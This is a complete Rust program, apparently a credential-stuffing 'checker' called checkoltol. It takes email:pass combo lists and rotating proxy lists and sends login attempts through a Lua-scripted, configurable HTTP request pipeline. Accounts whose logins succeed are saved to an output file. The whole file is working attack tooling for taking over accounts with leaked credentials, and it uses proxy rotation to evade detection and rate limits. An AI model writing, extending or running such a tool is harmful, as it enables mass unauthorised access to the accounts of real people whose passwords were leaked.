use std::convert::TryInto;
use std::io::Write;
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use std::str::FromStr;

use futures::stream::{self, StreamExt};
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use reqwest::header::HeaderMap;
use reqwest::{ClientBuilder, Method, Proxy, Response};
use rlua::{Context, Function, Lua, UserData, UserDataMethods};
use serde_json::Value;
use structopt::StructOpt;
use tokio::fs::{File, OpenOptions};

use anyhow::anyhow;

use crate::config::{CheckConfig, PipelineRequestBodyType, PipelineStep};
use crate::template::Templater;

pub mod config;
pub mod template;

pub type Anyhow<T> = anyhow::Result<T>;
pub type AnyhowError = anyhow::Error;

#[derive(StructOpt, Debug)]
#[structopt(name = "checkoltol")]
struct Opt {
    /// Max concurrent connections
    #[structopt(long, default_value = "20")]
    concurrent_connections: usize,

    /// File containing combos in email:pass notation
    #[structopt(long, parse(from_os_str))]
    combos: PathBuf,

    /// File containing proxies in proxy:port notation
    #[structopt(long, parse(from_os_str))]
    proxies: PathBuf,

    /// Config to be used for checking
    #[structopt(long, parse(from_os_str))]
    config: PathBuf,

    /// Output file
    #[structopt(long, parse(from_os_str))]
    output: PathBuf,
}

#[tokio::main]
async fn main() -> Anyhow<()> {
    let opt: Opt = Opt::from_args();

    // Read checking config to string
    let config = tokio::fs::read_to_string(opt.config).await?;
    // Read accounts to a vector of account
    let combos = read_file_to_lines(opt.combos.as_path()).await?;
    // Read proxies to a vector of proxy
    let proxies = read_file_to_lines(opt.proxies.as_path()).await?;

    let total_combos = combos.len();

    // We want a cycling iterator, so that it starts at the beginning after proxies are used up
    // TODO: Make this configurable
    let proxy_iter = proxies.iter().cycle();

    // Transform to an iterator yielding (account, proxy)
    let combo_and_proxy_iter = combos.iter().zip(proxy_iter);

    let mut stream = stream::iter(combo_and_proxy_iter.map(|(account, proxy)| {
        let account = account.clone();
        let config = &config;
        async move {
            let (user, password) = {
                let mut temp = account.split(':');
                (temp.next(), temp.next())
            };

            let check_config: CheckConfig = serde_yaml::from_str(config)?;

            let client = ClientBuilder::new().proxy(Proxy::all(proxy)?).build()?;
            let lua = Lua::new();

            lua.context(|ctx| -> Anyhow<_> {
                let urlencode = ctx.create_function(|_ctx, url: String| {
                    let encoded = utf8_percent_encode(&url, NON_ALPHANUMERIC).to_string();
                    Ok(encoded)
                })?;

                let base64encode = ctx.create_function(|_ctx, input: String| {
                    let encoded = base64::encode(&input);
                    Ok(encoded)
                })?;

                let base64decode = ctx.create_function(|_ctx, input: String| {
                    let decoded_bytes = base64::decode(&input).unwrap();
                    let decoded = std::str::from_utf8(&decoded_bytes).unwrap();
                    Ok(decoded.to_owned())
                })?;

                ctx.load(
                    r#"
                should_return = false
                function cancel()
                    should_return = true
                end
                "#,
                )
                .exec()?;

                ctx.globals().set("valid", false)?;
                ctx.globals().set("urlencode", urlencode)?;
                ctx.globals().set("base64encode", base64encode)?;
                ctx.globals().set("base64decode", base64decode)?;
                Ok(())
            })?;

            for step in &check_config.pipeline {
                match step {
                    PipelineStep::Request(request) => {
                        let response: Response = if let (Some(user), Some(password)) =
                            (user, password)
                        {
                            lua.context(|ctx| -> Anyhow<_> {
                                ctx.globals().set("user", user)?;
                                ctx.globals().set("password", password)?;
                                Ok(())
                            })?;

                            let method = Method::from_str(&request.method)?;

                            let mut request_builder = client.request(method.clone(), &request.url);

                            if let Some(ref body) = request.body {
                                match body {
                                    PipelineRequestBodyType::Json(value) => {
                                        let body = template_lua_expressions(
                                            &lua,
                                            &serde_json::to_string(value)?,
                                        )?;
                                        request_builder = request_builder.body(body);
                                    }
                                    PipelineRequestBodyType::Form(form) => {
                                        let mut form = form.clone();
                                        for value in form.values_mut() {
                                            *value = template_lua_expressions(&lua, value)?;
                                        }
                                        request_builder = request_builder
                                            .body(serde_urlencoded::to_string(form)?);
                                    }
                                    PipelineRequestBodyType::Plain(value) => {
                                        let body = template_lua_expressions(&lua, value)?;
                                        request_builder = request_builder.body(body);
                                    }
                                };
                            }

                            let mut headers = request.headers.clone();

                            for value in headers.values_mut() {
                                *value = template_lua_expressions(&lua, value)?;
                            }

                            let headers: HeaderMap = (&headers).try_into()?;

                            let request = request_builder.headers(headers).build()?;

                            Anyhow::Ok(client.execute(request).await?)
                        } else {
                            Anyhow::Err(anyhow!("Malformed combo"))
                        }?;

                        let status_code = response.status().as_u16();
                        let response_body = response.text().await?;

                        lua.context(|ctx| -> Anyhow<_> {
                            ctx.globals().set(
                                "response",
                                LuaResponse {
                                    body: response_body,
                                    status_code,
                                },
                            )?;
                            Ok(())
                        })?;
                    }
                    PipelineStep::Lua(code) => {
                        let should_cancel: bool = lua.context(|ctx| -> Anyhow<_> {
                            ctx.load(code).exec()?;
                            Ok(ctx.globals().get::<_, _>("should_cancel")?)
                        })?;

                        if should_cancel {
                            break;
                        }
                    }
                }
            }

            let valid: bool =
                lua.context(|ctx| -> Anyhow<_> { Ok(ctx.globals().get::<_, _>("valid")?) })?;

            Anyhow::Ok((valid, account))
        }
    }))
    .buffer_unordered(opt.concurrent_connections); // Limit concurrency to concurrent_connections

    let mut file = OpenOptions::new()
        .append(true)
        .open(opt.output)
        .await?
        .into_std()
        .await;

    let mut checked_combos: u32 = 0;
    let mut valid_accounts: u32 = 0;

    while let Some(value) = stream.next().await {
        if let Ok((valid, account)) = value {
            checked_combos += 1;
            if valid {
                valid_accounts += 1;
                writeln!(file, "{}", account)?;
            }
            if checked_combos % 10 == 0 {
                println!(
                    "Checked {} of {} combos, valid: {}",
                    checked_combos, total_combos, valid_accounts
                );
            }
        }
    }

    Ok(())
}

async fn read_file_to_lines(path: impl AsRef<Path>) -> Anyhow<Vec<String>> {
    let path = path.as_ref().to_owned();

    Ok(BufReader::new(File::open(path).await?.into_std().await)
        .lines()
        .collect::<Result<Vec<_>, _>>()?)
}

fn template_lua_expressions(lua: &Lua, template: &str) -> Anyhow<String> {
    let templater = Templater::new(&template);

    lua.context(|ctx| -> Anyhow<_> {
        templater.template(|expr| {
            let to_string: Function = ctx.globals().get("tostring")?;
            let value = ctx.load(expr).eval::<rlua::Value>()?;
            Ok(to_string.call::<_, String>(value)?)
        })
    })
}

#[derive(Clone)]
struct LuaResponse {
    body: String,
    status_code: u16,
}

impl UserData for LuaResponse {
    fn add_methods<'lua, M: UserDataMethods<'lua, Self>>(methods: &mut M) {
        methods.add_method("json", |ctx: Context, response, ()| {
            let result = (|| -> Anyhow<_> {
                let json: Value = serde_json::from_str(&response.body)?;
                let lua_value = rlua_serde::to_value(ctx, json)?;
                Ok(lua_value)
            })()
            .unwrap_or(rlua::Nil);
            Ok(result)
        });

        methods.add_method("status", |_, response, ()| Ok(response.status_code));

        methods.add_method("text", |_, response, ()| Ok(response.body.clone()));
    }
}
